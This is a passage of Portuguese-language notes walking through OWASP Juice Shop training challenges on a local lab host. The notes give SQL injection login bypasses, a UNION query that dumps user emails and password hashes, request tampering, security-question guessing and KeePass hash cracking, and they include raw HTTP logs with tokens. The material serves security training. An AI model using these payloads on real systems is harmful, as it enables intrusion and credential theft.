* Do desafio 21. #Improper Input Validation/Admin Registration# percebemos que são 3 roles: admin, customer e accounting (contabilidade) que pertence ao usuário accountant@juice-sh.op de id=15
* Login como `' OR id=15--` -> Acessar http://192.168.56.30:3000/#/accounting

![](./imgs/accounting.png)

* Alterando o preço pela aplicação e olhando a requisição feita:
```
PUT /api/Products/9 HTTP/1.1
Content-Length: 13
Accept: */*
Authorization: Bearer eyJ0...cQE
Content-Type: application/json
Connection: close

{"price":"2"}
```
* RESPOSTA:
```
{"status":"success",
"data":{
	"id":9,
	"name":"OWASP SSL Advanced Forensic Tool (O-Saft)",
	"description":"O-Saft is an easy to use tool to show information about SSL 	certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More...</a>",
	"price":"2",
	"deluxePrice":0.01,
	"image":"orange_juice.jpg",
	"createdAt":"2021-12-22T23:23:14.716Z",
	"updatedAt":"2021-12-23T01:30:41.022Z",
	"deletedAt":null
	}
}
```
* A requisição para resolver o desafio fica:
```
PUT /api/Products/9 HTTP/1.1
Content-Length: 249
Accept: */*
Authorization: Bearer eyJ0...cQE
Content-Type: application/json
Connection: close

{"description":"O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}
```

37. ***Broken Authentication/Reset Jim's Password*** -> Reset Jim’s password via the Forgot Password mechanism with the original answer to his security question.
* Login como Jim: `jim@juice-sh.op'--` ->  obtemos dados de sua atividade:
Endereço Jim: Room 3F 121, Deck 5, USS Enterprise, 1701 Space
Endereço Sam: Deneva Colony, Deneva, Beta Darius System, GSK783. United Federation of Planets
Reviews: Looks so much better on my uniform than the boring Starfleet symbol.
Reviews: Fresh out of a replicator.
Reviews: Looks spacy on Bones' new tricorder!
Secirity question: **Your eldest siblings middle name?** -> Nome do meio do seu irmão mais velho?
* Ligando os pontos, Jim parece ser um personagem de Star Trek (Jornada nas estrelas)
* Google: JIM STAR TREK -> Vamos parar no personagem **James T. Kirk** chamado de JIM por Spock -> sua familia pela Wikipedia:
> George Kirk (father)  
> Winona Kirk (mother)  
> George **Samuel** Kirk (brother)  
> Tiberius Kirk (grandfather)  
> James (maternal grandfather)  
> Aurelan Kirk (sister-in-law)  
> Peter Kirk (nephew)  
* Em http://192.168.56.30:3000/#/forgot-password -> Responder **Samuel** na Security Question e trocar a senha para resolver o desafio

38. ***Improper Input Validation/Upload Size*** -> Upload a file larger than 100 kB.
* Como usuário logado em http://192.168.56.30:3000/#/complain existe o campo de upload -> Ao escolher um arquivo nenhuma requisição ao servidor é feita mas se o arquivo for maior que 100Kb o botão de submit não aparece
* Tentar forçar o botão Submit a ficar ativo retirando `disabled="true"` -> Não adianta

![](./imgs/btnsubmit.png)

* De fato, inspecionando a requisição -> foi sem os dados do arquivo -> `POST http://192.168.56.30:3000/api/Complaints/ ... {"UserId":1,"message":"a"}`
* Com arquivo válido fica -> 
```
POST http://192.168.56.30:3000/api/Complaints/ HTTP/1.1
... 
{"UserId":1,"message":"a"}
```
```
POST http://192.168.56.30:3000/file-upload HTTP/1.1
Content-Type: multipart/form-data; 
Content-Length: 86179

------WebKitFormBoundaryOLuUj9VzYyntOsW5
Content-Disposition: form-data; name="file"; filename="SEC573_PythonCheatSheet_06272016.pdf"
Content-Type: application/pdf

%PDF-1.2
7 0 obj
<<
...
------WebKitFormBoundaryOLuUj9VzYyntOsW5———

```
* Repetindo a requisição pelo BURP com dados além de  Content-Length >100.000 -> Basta Duplicar trechos do body de um arquivo PDF até ultrapassar o limite para resolver.

![](./imgs/fileuploadburp.png)


39. ***Improper Input Validation/Upload Type*** -> Upload a file that has no .pdf or .zip extension.
* Como usuário logado em http://192.168.56.30:3000/#/complain existe o campo de upload
[Unrestricted File Upload Testing: Testing & Bypass Techniques](https://www.aptive.co.uk/blog/unrestricted-file-upload-testing/)

![](./imgs/trechofile.png)

_________________________________________

## 4 ESTRELAS
40. ***Injection/User Credentials*** -> Retrieve a list of all user credentials via SQL Injection.
```
GET /rest/products/search?q=apple'))%20UNION%20SELECT%20id,email,password,role,totpsecret,isActive,null,null,null%20FROM%20Users-- HTTP/1.1
Accept: */*
```
> {“id":1,"name":"admin@juice-sh.op","description":"0192023a7bbd73250516f069df18b500"  
> {“id":2,"name":"jim@juice-sh.op","description":"e541ca7ecf72b8d1286474fc613e5e45"  
> {“id":3,"name":"bender@juice-sh.op","description":"0c36e517e3fa95aabf1bbffc6744a4ef"  
> {“id":4,"name":"bjoern.kimminich@gmail.com","description":"6edd9d726cbdc873c539e41ae8757b8c"  
> {“id":5,"name":"ciso@juice-sh.op","description":"861917d5fa5f1172f931dc700d81a8fb"  
> {“id":6,"name":"support@juice-sh.op","description":"d57386e76107100a7d6c2782978b2e7b"  
> {“id":7,"name":"morty@juice-sh.op","description":"f2f933d0bb0ba057bc8e33b8ebd6d9e8"  
> {“id":8,"name":"mc.safesearch@juice-sh.op","description":"b03f4b0ba8b458fa0acdc02cdb953bc8"  
> {“id":9,"name":"J12934@juice-sh.op","description":"3c2abc04e4a6ea8f1327d0aae3714b7d",  
> {“id":10,"name":"wurstbrot@juice-sh.op","description":"9ad5b0492bbe528583e128d2a8941de4"  
> {“id":11,"name":"amy@juice-sh.op","description":"030f05e45e30710c3ad3c32f00de0473"  
> {“id":12,"name":"bjoern@juice-sh.op","description":"7f311911af16fa8f418dd1a3051d6810"  
> {“id":13,"name":"bjoern@owasp.org","description":"9283f1b2e9669749081963be0462e466",{"id":14,"name":"chris.pike@juice-sh.op","description":"10a783b9ed19ea1c67c3a27699f0095b",  
> {“id":15,"name":"accountant@juice-sh.op","description":"963e10f92a70b4b463220cb4c5d636dc"  
> {“id":16,"name":"uvogin@juice-sh.op","description":"05f92148b4b60f7dacd04cceebb8f1af",{"id":17,"name":"demo","description":"fe01ce2a7fbac8fafaed7c982a04e229"  

41. ***Sensitive Data Exposure/Access Log*** -> Gain access to any access log file of the server.


 http://192.168.56.30:3000/ftp/incident-support.kdbx -> Para abrir este aqruivo é necessário KeePass-2.49 para Windows ou keepass2 para Debiam/Ubunto
* $ apt install keepas2
* $ keepass2
* Abrir o arquivo incident-support.kdbx

![](./imgs/keepass.png)

* $ keepass2john incident-support.kdbx > hash.txt
```
incident-support:$keepass$*2*1*0*49dc48964f1b17385923c8421b4c5f07e159657a9af8814e05e135c34d2ea7e9*3602c14dffbd103014d7f56dd6c6641cb00a43f7346e8119fef5e4b15e1f6fa8*1cc4846f661c02ecc025bd917d9c34f8*b5b2a2ebcc864d164086407c8e67ca91fd03d21c1c26178b1da0cc2ff49f8534*5e830b9b4ff18ed529be50b548bc746be048399e1a4d778dfad3c4c4623bc507
```
* $ john hash.txt  # Depois de muuuuuito tempo
- [ ] FALTANDO


Login como BJORN: `OR id=13 --`
- - - -
POST _api_SecurityAnswers/ HTTP/1.1
Host: 192.168.56.30:3000
Content-Length: 60
Pragma: no-cache
Cache-Control: no-cache
Accept: application_json, text_plain, **/**
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Content-Type: application/json
Origin: http://192.168.56.30:3000
Referer: http://192.168.56.30:3000/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=pt_BR; continueCode=4xavj0pphyteU8HqhXT6F5iKmfwDSDPuaKIvDUz1HMnfN7tJvcXpT9M0gOoZ; io=sMrinlcyp76_JAgRAACS
Connection: close

{"UserId":20,"answer":"harrypotter","SecurityQuestionId":11}

- - - -
HTTP/1.1 201 Created
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
Location: _api_SecurityAnswers/17
Content-Type: application/json; charset=utf-8
Content-Length: 227
ETag: W/"e3-ZTtO6dPe5gjKs8uZIIIg+9xlE6c"
Vary: Accept-Encoding
Date: Sun, 28 Nov 2021 01:07:11 GMT
Connection: close

{"status":"success",
"data": {"id":17,
"UserId":20, 
"answer":"3aa56b2694853e84c7660e6beb2f168fb26b5a94aaff38aee661ea6e1d475e1e",
"SecurityQuestionId":11,
"updatedAt":"2021-11-28T01:07:11.113Z",
"createdAt":"2021-11-28T01:07:11.113Z"}
}
- - - -



curl 'http://192.168.56.30:3000/rest/user/login' -H 'Content-Type: application/json' --data-binary $'{"email":"mc.safesearch@juice-sh.op","password":"123456"}'


POST http://192.168.56.30:3000/rest/user/data-export

{"userData":"{
  "username": "",
  "email": "mc.safesearch@juice-sh.op",
  "orders": [],
  "reviews": [
    {
      "message": "I straight-up gots nuff props fo'these tattoos!",
      "author": "mc.safesearch@juice-sh.op",
      "productId": 17,
      "likesCount": 0,
      "likedBy": []
    },
    {
      "message": "This thang would look phat on Bobby's jacked fur coat!",
      "author": "mc.safesearch@juice-sh.op",
      "productId": 20,
      "likesCount": 0,
      "likedBy": []
    },
    {
      "message": "Here yo' learn how tha fuck ta not show yo' goddamn phone on camera!",
      "author": "mc.safesearch@juice-sh.op",
      "productId": 36,
      "likesCount": 0,
      "likedBy": []
    },
    {
      "message": "Rad, dude!",
      "author": "mc.safesearch@juice-sh.op",
      "productId": 37,
      "likesCount": 0,
      "likedBy": []
    }
  ],
  "memories": []
}","confirmation":"Your data export will open in a new Browser window."}


POST /profile HTTP/1.1
Host: 192.168.56.30:3000
Proxy-Connection: keep-alive
Content-Length: 11
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://192.168.56.30:3000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: text_html,application_xhtml+xml,application_xml;q=0.9,image_webp,image_apng,_****;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.56.30:3000/profile
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=pt_BR; continueCode=o1rzGQ7hWtKU4H8hDT9FKfViqZf7eSxjuOkIkwUvbHL9fPOtDYtOnTxOANVD; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OCwidXNlcm5hbWUiOiIiLCJlbWFpbCI6Im1jLnNhZmVzZWFyY2hAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImIwM2Y0YjBiYThiNDU4ZmEwYWNkYzAyY2RiOTUzYmM4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTExLTI4IDE0OjIzOjE2LjYzOSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTExLTI4IDE0OjIzOjE2LjYzOSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzgxMDk2NjAsImV4cCI6MTYzODEyNzY2MH0.j9rbKVSsi5uZB727sGJmHEqRasr3APJMeZWB13bJmuyVZdS4KJDafH-3mgomMrcDnI-vbh0TWWHChIg-NAus91q1Ih20--9yECdSHTc6ONCpAcBNagcfOrjAAEF1tWirvP-zFA8mt_JNaBJ5Vez5kQfnpRppSn7pHOl8-jBDfOg; io=E-DkdCuoy2uT_coGAAAB

username=mc


___

Admin Auth Header
GET _rest_user_authentication-details_ HTTP/1.1
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMS0xMS0yOCAxNDoyMzoxNi42MzUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMS0xMS0yOCAxNDoyMzoxNi42MzUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjM4MTEwNzUyLCJleHAiOjE2MzgxMjg3NTJ9.mkgrcECaqvaGZr5No4os5TfHJICH9AVDpXxk-9016bmSBO8qDMuo5NyIPrcF7WX4z19cIxBwrgXw2S2o2aiD3xwu0xcIrTVvcRdimwSoJ6WUmer_o7XlXpFagpGleUFVLwgcoDodDKSopm66jVmmue1GZT85ycwC_a32_h3Vmt8
Content-Length: 2


PUT _api_Addresss/3 HTTP/1.1
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMS0xMS0yOCAxNDoyMzoxNi42MzUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMS0xMS0yOCAxNDoyMzoxNi42MzUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjM4MTEwNzUyLCJleHAiOjE2MzgxMjg3NTJ9.mkgrcECaqvaGZr5No4os5TfHJICH9AVDpXxk-9016bmSBO8qDMuo5NyIPrcF7WX4z19cIxBwrgXw2S2o2aiD3xwu0xcIrTVvcRdimwSoJ6WUmer_o7XlXpFagpGleUFVLwgcoDodDKSopm66jVmmue1GZT85ycwC_a32_h3Vmt8
Content-Type: application/json
Content-Length: 150

{"country":"Test'","fullName":"Administrator","mobileNum":1234567890,"zipCode":"4711","streetAddress":"0815 Test Street","city":"Test","state":"Test"}


POST _rest_user/data-export HTTP/1.1
Content-Length: 31
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OCwidXNlcm5hbWUiOiIiLCJlbWFpbCI6Im1jLnNhZmVzZWFyY2hAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImIwM2Y0YjBiYThiNDU4ZmEwYWNkYzAyY2RiOTUzYmM4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTExLTI4IDE0OjIzOjE2LjYzOSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTExLTI4IDE0OjIzOjE2LjYzOSArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzgxMDk2NjAsImV4cCI6MTYzODEyNzY2MH0.j9rbKVSsi5uZB727sGJmHEqRasr3APJMeZWB13bJmuyVZdS4KJDafH-3mgomMrcDnI-vbh0TWWHChIg-NAus91q1Ih20--9yECdSHTc6ONCpAcBNagcfOrjAAEF1tWirvP-zFA8mt_JNaBJ5Vez5kQfnpRppSn7pHOl8-jBDfOg

{"answer":"3ZdV7","format":"1"}


GET _rest_user/change-password?current=123456%27&new=123456&repeat=123456 HTTP/1.1
Accept: application_json, text_plain, **/**
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJiam9lcm5Ab3dhc3Aub3JnIiwicGFzc3dvcmQiOiI5MjgzZjFiMmU5NjY5NzQ5MDgxOTYzYmUwNDYyZTQ2NiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImVmZTJmMTU5OWUyZDkzNDQwZDUyNDNhMWZmYWY1YTQxM2I3MGNmM2FjOTcxNTZiZDZmYWI5YjVkZGZjYmUwZTQiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvMTIuanBnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTExLTI4IDE0OjIzOjE2LjY0MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTExLTI4IDE4OjM1OjE0LjY4NyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzgxMzE5MDcsImV4cCI6MTYzODE0OTkwN30.KxXK7QSRtlDy9fv68HVyJPa_ZUXVO-ejp8XchVdwlOklwYoWMgjgF9J4Y_0uZXL8rLRNm5Eoi3LQ5SY8b9y-Wm15ZCsTo1ha09nhRfaB9ubsR_WcIGsf_0xDB0D9HryRpeOtkulTGHNG7LTNrFQoj-p-tfhDI9euQCo4XFUujcc
Connection: close



GET _rest_user/whoami HTTP/1.1
Cookie: welcomebanner_status=dismiss; cookieconsent_status=dismiss; language=pt_BR; continueCode=ax0a1hoteUzHmhRTmFefBiNNhqVfP8SWPu5MI35c8aUeqfqVtjKcwDTvX0eR; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTMsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJiam9lcm5Ab3dhc3Aub3JnIiwicGFzc3dvcmQiOiI5MjgzZjFiMmU5NjY5NzQ5MDgxOTYzYmUwNDYyZTQ2NiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImVmZTJmMTU5OWUyZDkzNDQwZDUyNDNhMWZmYWY1YTQxM2I3MGNmM2FjOTcxNTZiZDZmYWI5YjVkZGZjYmUwZTQiLCJsYXN0TG9naW5JcCI6InVuZGVmaW5lZCIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvMTIuanBnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIxLTExLTI4IDE0OjIzOjE2LjY0MCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIxLTExLTI4IDE4OjM1OjE0LjY4NyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2MzgxMzE5MDcsImV4cCI6MTYzODE0OTkwN30.KxXK7QSRtlDy9fv68HVyJPa_ZUXVO-ejp8XchVdwlOklwYoWMgjgF9J4Y_0uZXL8rLRNm5Eoi3LQ5SY8b9y-Wm15ZCsTo1ha09nhRfaB9ubsR_WcIGsf_0xDB0D9HryRpeOtkulTGHNG7LTNrFQoj-p-tfhDI9euQCo4XFUujcc; io=wVSDK0up1Q8ZSd4BAAAL



GET _rest_user_authentication-details_ HTTP/1.1
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMS0xMS0yOCAxNDoyMzoxNi42MzUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMS0xMS0yOCAxNDoyMzoxNi42MzUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjM4MTEwNzUyLCJleHAiOjE2MzgxMjg3NTJ9.mkgrcECaqvaGZr5No4os5TfHJICH9AVDpXxk-9016bmSBO8qDMuo5NyIPrcF7WX4z19cIxBwrgXw2S2o2aiD3xwu0xcIrTVvcRdimwSoJ6WUmer_o7XlXpFagpGleUFVLwgcoDodDKSopm66jVmmue1GZT85ycwC_a32_h3Vmt8



GET /rest/user/security-question?email=bjoern@owasp.org HTTP/1.1
Content-Length: 2
